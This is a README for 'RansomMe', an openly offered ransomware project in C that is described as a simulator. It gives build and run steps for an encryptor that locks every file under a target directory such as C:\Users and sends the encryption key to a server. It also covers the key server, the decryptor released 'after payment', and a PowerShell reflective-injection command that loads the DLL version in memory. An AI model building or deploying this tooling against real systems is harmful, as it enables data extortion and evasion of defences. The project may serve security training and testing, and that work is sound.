# RansomMe

A simple ransomware simulator using the CNG API (aka BCrypt) in C. The full project is made of several parts:

- **RansomMe.exe** -- It gets as input parameters a target directory, an extension and a server name. It will encrypt all files in the target directory using AES256, appending the extension to all the encrypted files and will encrypt (RSA4096 public key) and send the symmetric key to the server.
- **Server.py** -- It will receive the encrypted key, parse it and decrypt it using the RSA4096 private key. The code includes a parsing function to convert the BCrypt-generated private key into a readable format for the python library.
- **Decryptor.exe** -- This is the decryptor. It is supposed to be realeased, together with the decrypted symmetric key, to the victim when they hypothetically make the ransom payment. It accepts a target directory, extension and a path to the key as parameters.
- **RansomMeDLL.dll** -- A DLL version that can be used with Invoke-ReflectivePEInjection.
- **KeyGenerator.exe** -- An auxiliary C application to generate an RSA4096 public/private key pair compatible with the BCrypt API.

# Set me up

Begin generating a public/private key pair:
```
.\KeyGenerator.exe
```
Then copy the private key to the server folder (the name must be `private.bin`) and run the server. The server can be run on Linux too:
```
mv .\private.bin ..\Server\private.bin
```
Install the python requirements like the cryptography:
```
pip install cryptography
```
Run the server:
```
.\server_cng.py
```
Copy the public key into the `crypto.c` file and compile the code:
```
// The public key bytes are hardcoded, this function import it
static NTSTATUS LoadPublicKey(BCRYPT_ALG_HANDLE* hProv, BCRYPT_KEY_HANDLE* hKey) {

    // Public key
    BYTE keyBlob[] = {
    0x52, 0x53, 0x41, 0x31, 0x00, 0x10, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xDC, 0x5F, 0xF9, 0x31, 0x2C,
    0x3B, 0xCA, 0x3E, 0xF0, 0xAF, 0x9B, 0x55, 0xDB, 0xA7, 0x29, 0xDA, 0x74, 0x2B, 0xEB, 0xBC, 0xF9,
    ...
    
    DWORD cbKeyBlob = sizeof(keyBlob);
    NTSTATUS status = 0;
```
Now execute the RansomMe.exe on the victim:
```
Usage: .\RansomMe.exe
                /t:<targetDir> (mandatory)
                /e:<cryptoExtension> (default=enc)
                /h:<serverName> (default=127.0.0.1)
                /p:<serverPort> (default:80)
                /n:<threadNum> (default=number of processors)
```
To run with the default options:
```
.\RansomMe.exe /t:C:\Users
```
You can run the DLL in memory like this (the default options must be changed in the source code):
```
$PEBytes = [IO.File]::ReadAllBytes('C:\Temp\RansomMeDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType Param -ExeArgs "C:\Users"
```
If you want to decrypt, just copy the Decryptor.exe and the key.bin (from the server folder) into the victim and run:
```
Usage: .\Decryptor.exe
        /t:<targetDir> (mandatory)
        /e:<cryptoExtension> (default=enc)
        /k:<keyFile> (default:.\key.bin)
        /n:<threadNum> (default=number of processors)
```
To run with the default options:
```
.\Decryptor.exe /t:C:\Users
```
Make sure you do not modify any file that is encrypted and use the same extension when decrypting. The decryptor will only attempt to decrypt files with that extension.
